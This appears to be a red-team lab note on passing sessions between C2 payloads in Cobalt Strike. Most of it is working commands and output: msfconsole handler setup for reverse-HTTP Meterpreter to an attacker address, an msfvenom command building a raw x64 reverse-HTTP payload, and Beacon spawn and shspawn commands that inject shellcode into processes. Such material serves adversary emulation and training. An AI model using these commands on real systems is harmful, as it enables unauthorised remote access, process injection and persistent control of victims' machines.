As we know in Cobalt Strike (and many other C2 frameworks), payloads are tied very closely to listeners.  Session passing is a process where you spawn a new C2 session from one payload/listener type to another.  For example, we could have a long-haul Beacon checking in over DNS, which we can use to spawn a different short-haul Beacon over HTTP.  It's also possible to pass sessions between completely different C2 frameworks, such as spawning a Meterpreter session from Beacon.

This is useful for several reasons, including:

- Leverage a capability within a framework that Cobalt Strike doesn't have.
- Use different C2 frameworks as backup access in the event the current access is lost.
- To emulate specific TTPs.

# Beacon Passing

The spawn command will spawn an x86 or x64 process and inject shellcode for the specified listener into it.
In this example, I have a DNS Beacon checking in from bfarmer every 1 minute. Instead of operating through this Beacon, I want to leave it open as a lifeline on a slow check-in.  In which case, I can spawn a new HTTP session and work from there instead.

    beacon> spawn x64 http

# Foreign Listener (msf)

The foreign listener in Cobalt Strike is designed to stage Meterpreter HTTP/HTTPS implants from Beacon, although it's technically compatible with any implant that supports the MSF staging protocol.  Start msfconsole and create a new reverse HTTP Meterpreter listener.

    attacker@ubuntu ~> sudo msfconsole -q
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
    msf6 exploit(multi/handler) > set LHOST ens5
    msf6 exploit(multi/handler) > set LPORT 8080

You must use the "staged" reverse_http payload type and ensure you use a port that Cobalt Strike is not already listening on.

    msf6 exploit(multi/handler) > run
    [*] Started HTTP reverse handler on http://10.10.5.50:8080

Go to the listener management in Cobalt Strike and create a new Foreign HTTP listener.  The stager host and port must match your MSF multi handler.

![foreign-http](https://github.com/user-attachments/assets/04d11ae1-de63-4f9d-8018-c37fdb3b4f57)

This listener will now be available within all the relevant Beacon commands such as spawn, jump and elevate.  For instance, spawn msf will spawn a process and inject Meterpreter shellcode into it, thus giving us a Meterpreter session.

    [*] http://10.10.5.50:8080 handling request from 10.10.122.254; (UUID: t6qekc2g) Staging x86 payload (176732 bytes) ...

    meterpreter > sysinfo

    System Language : en_US
    Domain          : DEV

    Meterpreter     : x86/windows

- Two downsides to the foreign listener is that it only supports x86 staged payloads (no x64 or stageless).


# Spawn and Inject



Cobalt Strike has two further generic injection commands that can be utilised for the purpose of session passing: shinject and shspawn.  Both allow you to inject an arbitrary shellcode blob - shinject can inject into an existing process, and shspawn will spawn a new process.

First, change the multi handler to use a stageless x64 Meterpreter payload.

    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_http
    msf6 exploit(multi/handler) > exploit
    
    [*] Started HTTP reverse handler on http://10.10.5.50:8080

Next, generate the associated payload using msfvenom inside WSL, and save the output to your Payloads directory.

    ubuntu@DESKTOP-3BSK7NO ~> msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 201820 bytes
    Saved as: /mnt/c/Payloads/msf_http_x64.bin

Finally, use shspawn to spawn a process and inject it.

    beacon> shspawn x64 C:\Payloads\msf_http_x64.bin
